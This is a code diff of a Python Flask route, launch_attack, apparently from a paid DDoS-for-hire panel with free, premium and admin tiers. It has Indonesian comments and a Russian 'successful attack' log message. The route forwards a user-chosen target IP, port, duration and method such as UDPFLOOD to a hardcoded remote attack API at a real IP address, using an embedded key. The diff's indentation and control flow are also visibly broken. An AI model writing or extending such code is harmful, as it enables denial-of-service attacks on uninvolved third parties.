@@ -151,19 +151,17 @@ def launch_attack():
     ]
 
     if role == 'admin':
-        pass
+        pass  # nanti logic admin
 
 elif role == 'premium':
     if method not in free_methods + premium_methods:
         flash('Method tidak valid!', 'error')
         return redirect(url_for('index'))
 
-        print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
-        
-# Jika sampai sini berarti request diizinkan
-        flash('Aksi berhasil dijalankan!', 'success')
-        return redirect(url_for('index'))
-    # lanjut kode attack di bawah sini
+    # Kalau valid, baru lanjut
+    print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
+
+    flash('Aksi berhasil dijalankan!', 'success')
     if method == "UDPFLOOD":
         url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
         requests.get(url)
